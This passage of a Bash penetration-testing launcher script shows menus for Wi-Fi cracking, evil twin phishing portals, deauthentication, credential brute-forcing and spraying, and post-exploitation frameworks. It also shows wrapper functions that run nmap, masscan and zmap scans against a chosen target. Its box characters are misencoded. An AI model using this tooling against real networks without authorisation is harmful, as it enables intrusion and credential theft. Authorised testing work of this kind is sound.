        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[5]${C_RESET} Convert to Hashcat       ${C_SHADOW}cap â†’ hccapx/hc22000${C_RESET}                  ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[6]${C_RESET} John the Ripper          ${C_SHADOW}Alternative CPU cracker${C_RESET}               ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[7]${C_RESET} Cowpatty                 ${C_SHADOW}WPA/WPA2 PSK offline${C_RESET}                  ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_aircrack_dict ;;
            2) cmd_aircrack_wordlist ;;
            3) cmd_hashcat_gpu ;;
            4) cmd_hashcat_rules ;;
            5) cmd_convert_hashcat ;;
            6) cmd_john_the_ripper ;;
            7) cmd_cowpatty ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_evil_twin() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                      ${C_PURPLE}ğŸ‘¿ EVIL TWIN ATTACK${C_RESET}                         ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[1]${C_RESET} Scan for targets         ${C_SHADOW}Find APs to clone${C_RESET}                    ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[2]${C_RESET} Create Evil Twin         ${C_SHADOW}Clone target AP${C_RESET}                       ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[3]${C_RESET} Captive Portal           ${C_SHADOW}Phishing login page${C_RESET}                   ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[4]${C_RESET} Karma Attack             ${C_SHADOW}Respond to all probes${C_RESET}                 ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[5]${C_RESET} Deauth Original          ${C_SHADOW}Force clients to rogue AP${C_RESET}               ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[6]${C_RESET} Stop Attack              ${C_SHADOW}Kill all rogue processes${C_RESET}               ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_evil_twin_scan ;;
            2) cmd_evil_twin_create ;;
            3) cmd_captive_portal ;;
            4) cmd_karma_attack ;;
            5) cmd_deauth ;;
            6) cmd_evil_twin_stop ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_web() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_BLOOD}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_BLOOD}â•‘${C_RESET}                    ${C_SKULL}ğŸŒ WEB ATTACKS${C_RESET}                            ${C_BLOOD}â•‘${C_RESET}"
        echo -e "    ${C_BLOOD}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Nikto Scan          ${C_SHADOW}nikto -h${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} WordPress Scan      ${C_SHADOW}wpscan --url${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Directory Brute     ${C_SHADOW}gobuster dir${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} FFUF Fuzzing        ${C_SHADOW}ffuf -u -w${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Burp Suite          ${C_SHADOW}burpsuite${C_RESET}"
        echo -e "    ${C_GHOST}[6]${C_RESET} SQL Injection       ${C_SHADOW}sqlmap --wizard${C_RESET}"
        echo -e "    ${C_GHOST}[7]${C_RESET} Nuclei              ${C_SHADOW}Fast vuln scanner${C_RESET}"
        echo -e "    ${C_GHOST}[8]${C_RESET} httpx               ${C_SHADOW}HTTP probing${C_RESET}"
        echo -e "    ${C_GHOST}[9]${C_RESET} Subfinder           ${C_SHADOW}Subdomain discovery${C_RESET}"
        echo -e "    ${C_GHOST}[10]${C_RESET} Amass              ${C_SHADOW}Attack surface mapping${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_nikto ;;
            2) get_target && run_wpscan ;;
            3) get_target && run_gobuster ;;
            4) get_target && run_ffuf ;;
            5) run_burpsuite ;;
            6) cmd_sqlmap ;;
            7) get_target && run_nuclei ;;
            8) get_target && run_httpx ;;
            9) get_target && run_subfinder ;;
            10) get_target && run_amass ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_osint() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_GHOST}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${C_RESET}"
        echo -e "    ${C_GHOST}â•‘${C_RESET}                    ${C_SKULL}ğŸ” OSINT RECON${C_RESET}                            ${C_GHOST}â•‘${C_RESET}"
        echo -e "    ${C_GHOST}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C_RESET}"
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} theHarvester        ${C_SHADOW}Email, subdomain harvesting${C_RESET}"
        echo -e "    ${C_GHOST}[2]${C_RESET} Recon-ng            ${C_SHADOW}Web reconnaissance framework${C_RESET}"
        echo -e "    ${C_GHOST}[3]${C_RESET} Shodan Search       ${C_SHADOW}Internet device search${C_RESET}"
        echo -e "    ${C_GHOST}[4]${C_RESET} Whois Lookup        ${C_SHADOW}Domain registration info${C_RESET}"
        echo -e "    ${C_GHOST}[5]${C_RESET} Google Dork         ${C_SHADOW}Advanced search queries${C_RESET}"
        echo
        echo -e "    ${C_SHADOW}[0] Back${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
        
        case "$choice" in
            1) get_target && run_theharvester ;;
            2) run_reconng ;;
            3) get_target && run_shodan ;;
            4) get_target && run_whois ;;
            5) cmd_google_dork ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_session() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                      ${C_FIRE}ğŸ“ SESSION MANAGEMENT${C_RESET}                         ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[1]${C_RESET} Start New Session        ${C_SHADOW}Begin new engagement${C_RESET}                  ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[2]${C_RESET} Resume Session           ${C_SHADOW}Continue previous work${C_RESET}               ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[3]${C_RESET} Session Status           ${C_SHADOW}View current progress${C_RESET}                ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[4]${C_RESET} Add Notes                ${C_SHADOW}Document findings${C_RESET}                    ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[5]${C_RESET} Export Session           ${C_SHADOW}Package for reporting${C_RESET}                 ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[6]${C_RESET} List All Sessions        ${C_SHADOW}Browse history${C_RESET}                      ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) session_start ;;
            2) session_resume ;;
            3) session_status ;;
            4) session_notes ;;
            5) session_export ;;
            6) session_list ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_creds() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                      ${C_FIRE}ğŸ”‘ CREDENTIAL ATTACKS${C_RESET}                       ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[1]${C_RESET} Hashcat (GPU)            ${C_SHADOW}Offline cracking${C_RESET}                    ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[2]${C_RESET} Hashcat (Rules)          ${C_SHADOW}Rule-based attacks${C_RESET}                  ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[3]${C_RESET} John the Ripper          ${C_SHADOW}CPU cracking${C_RESET}                        ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[4]${C_RESET} Hydra                    ${C_SHADOW}Online brute force${C_RESET}                  ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[5]${C_RESET} Medusa                   ${C_SHADOW}Parallel login attacks${C_RESET}              ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[6]${C_RESET} CrackMapExec             ${C_SHADOW}AD/SMB spray${C_RESET}                       ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_hashcat_gpu ;;
            2) cmd_hashcat_rules ;;
            3) cmd_john_the_ripper ;;
            4) cmd_hydra_bruteforce ;;
            5) cmd_medusa_bruteforce ;;
            6) cmd_crackmapexec ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

menu_post_exploit() {
    while true; do
        clear
        show_mini_banner
        echo
        echo -e "    ${C_SKULL}â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                      ${C_PURPLE}ğŸ§  POST-EXPLOITATION${C_RESET}                      ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[1]${C_RESET} Empire                  ${C_SHADOW}PowerShell C2${C_RESET}                       ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[2]${C_RESET} Covenant                ${C_SHADOW}C# C2 platform${C_RESET}                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[3]${C_RESET} Mimikatz (impacket)     ${C_SHADOW}Credential extraction${C_RESET}             ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[4]${C_RESET} Impacket Scripts        ${C_SHADOW}Remote exec toolkit${C_RESET}                ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}                                                                     ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â”‚${C_RESET}  ${C_GHOST}[0]${C_RESET} Back                                                           ${C_SKULL}â”‚${C_RESET}"
        echo -e "    ${C_SKULL}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜${C_RESET}"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice

        case "$choice" in
            1) cmd_empire ;;
            2) cmd_covenant ;;
            3) cmd_mimikatz ;;
            4) cmd_impacket_scripts ;;
            0) return ;;
            *) log_error "Invalid selection" ;;
        esac
        pause
    done
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - SCANNING
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

run_nmap_quick() {
    check_tool "nmap" || return 1
    local outfile="${OUTPUT_FILE}_quick.txt"
    operation_header "Quick Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -T4 -F -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning ports..."
    nmap -T4 -F -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Quick scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_full() {
    check_tool "nmap" || return 1
    require_root || return 1
    local outfile="${OUTPUT_FILE}_full.txt"
    operation_header "Full Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sS -sV -sC -A -p- -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning all ports with service detection..."
    nmap -sS -sV -sC -A -p- -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Full scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_stealth() {
    check_tool "nmap" || return 1
    require_root || return 1
    local outfile="${OUTPUT_FILE}_stealth.txt"
    operation_header "Stealth Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sS -T2 -f --data-length 24 -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning with fragmentation and low timing..."
    nmap -sS -T2 -f --data-length 24 -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Stealth scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_vuln() {
    check_tool "nmap" || return 1
    local outfile="${OUTPUT_FILE}_vuln.txt"
    operation_header "Vulnerability Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap --script vuln -oN \"${outfile}\" \"${TARGET}\""
    log_info "Running vuln scripts..."
    nmap --script vuln -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    operation_summary "Vulnerability scan" "$start_ms" "$outfile"
}

run_nmap_udp() {
    check_tool "nmap" || return 1
    require_root || return 1
    local outfile="${OUTPUT_FILE}_udp.txt"
    operation_header "UDP Scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sU --top-ports 100 -oN \"${outfile}\" \"${TARGET}\""
    log_info "Scanning top 100 UDP ports..."
    nmap -sU --top-ports 100 -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "UDP scan" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_nmap_service() {
    check_tool "nmap" || return 1
    local outfile="${OUTPUT_FILE}_services.txt"
    operation_header "Service Detection" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sV --version-intensity 5 -oN \"${outfile}\" \"${TARGET}\""
    log_info "Detecting services and versions..."
    nmap -sV --version-intensity 5 -oN "$outfile" "$TARGET" | tee -a "${LOG_DIR}/nmap.log"
    local open_ports
    open_ports=$(get_open_ports "$outfile")
    operation_summary "Service detection" "$start_ms" "$outfile" "Open ports: ${open_ports:-unknown}"
}

run_rustscan() {
    check_tool "rustscan" || return 1
    local outfile="${OUTPUT_FILE}_rustscan.txt"
    operation_header "Rustscan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "rustscan -a \"${TARGET}\" --ulimit 5000 -- -sV -oN \"${outfile}\""
    log_info "Scanning fast ports with rustscan..."
    rustscan -a "$TARGET" --ulimit 5000 -- -sV -oN "$outfile" | tee -a "${LOG_DIR}/rustscan.log"
    operation_summary "Rustscan" "$start_ms" "$outfile"
}

run_unicornscan() {
    check_tool "unicornscan" || return 1
    local outfile="${OUTPUT_FILE}_unicornscan.txt"
    operation_header "Unicornscan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "unicornscan -Iv -p 1-65535 \"${TARGET}\""
    log_info "Scanning full port range with unicornscan..."
    unicornscan -Iv -p 1-65535 "$TARGET" | tee "$outfile"
    operation_summary "Unicornscan" "$start_ms" "$outfile"
}

run_zmap() {
    check_tool "zmap" || return 1
    require_root || return 1
    echo -ne "    ${C_GHOST}Port to scan [80]: ${C_RESET}"
    read -r zmap_port
    zmap_port="${zmap_port:-80}"
    echo -ne "    ${C_GHOST}Rate limit (pps) [10000]: ${C_RESET}"
    read -r zmap_rate
    zmap_rate="${zmap_rate:-10000}"
    local outfile="${OUTPUT_FILE}_zmap.txt"
    operation_header "Zmap" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "zmap -p \"${zmap_port}\" \"${TARGET}\" -r \"${zmap_rate}\" -o \"${outfile}\""
    log_info "Running high-speed zmap scan..."
    zmap -p "$zmap_port" "$TARGET" -r "$zmap_rate" -o "$outfile" | tee -a "${LOG_DIR}/zmap.log"
    operation_summary "Zmap" "$start_ms" "$outfile"
}

run_masscan() {
    check_tool "masscan" || return 1
    require_root || return 1
    echo -ne "    ${C_GHOST}Rate (default 10000): ${C_RESET}"
    read -r rate
    rate="${rate:-10000}"
    local outfile="${OUTPUT_FILE}_masscan.txt"
    operation_header "Masscan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "masscan -p1-65535 --rate=\"${rate}\" -oL \"${outfile}\" \"${TARGET}\""
    log_info "Running masscan at rate ${rate}..."
    masscan -p1-65535 --rate="$rate" -oL "$outfile" "$TARGET" | tee -a "${LOG_DIR}/masscan.log"
    operation_summary "Masscan" "$start_ms" "$outfile"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - DISCOVERY
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

run_arp_scan() {
    check_tool "arp-scan" || return 1
    require_root || return 1
    operation_header "ARP Scan" "local"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "arp-scan -l"
    log_info "Scanning local network with arp-scan..."
    arp-scan -l | tee -a "${LOG_DIR}/arp-scan.log"
    operation_summary "ARP scan" "$start_ms" "${LOG_DIR}/arp-scan.log"
}

run_ping_sweep() {
    check_tool "nmap" || return 1
    operation_header "Ping Sweep" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -sn \"${TARGET}\""
    log_info "Sweeping hosts with nmap ping scan..."
    nmap -sn "$TARGET" | tee -a "${LOG_DIR}/discovery.log"
    operation_summary "Ping sweep" "$start_ms" "${LOG_DIR}/discovery.log"
}

run_netdiscover() {
    check_tool "netdiscover" || return 1
    require_root || return 1
    operation_header "Netdiscover" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "timeout 30 netdiscover -r \"${TARGET}\" -P"
    log_info "Running netdiscover (30s window)..."
    timeout 30 netdiscover -r "$TARGET" -P | tee -a "${LOG_DIR}/netdiscover.log"
    operation_summary "Netdiscover" "$start_ms" "${LOG_DIR}/netdiscover.log"
}

run_os_detect() {
    check_tool "nmap" || return 1
    require_root || return 1
    operation_header "OS Detection" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap -O \"${TARGET}\""
    log_info "Running nmap OS detection..."
    nmap -O "$TARGET" | tee -a "${LOG_DIR}/os-detect.log"
    operation_summary "OS detection" "$start_ms" "${LOG_DIR}/os-detect.log"
}

run_p0f() {
    check_tool "p0f" || return 1
    require_root || return 1
    get_interface || return 1
    operation_header "Passive fingerprinting" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "p0f -i \"${IFACE}\""
    log_info "Starting passive fingerprinting on $IFACE (Ctrl+C to stop)"
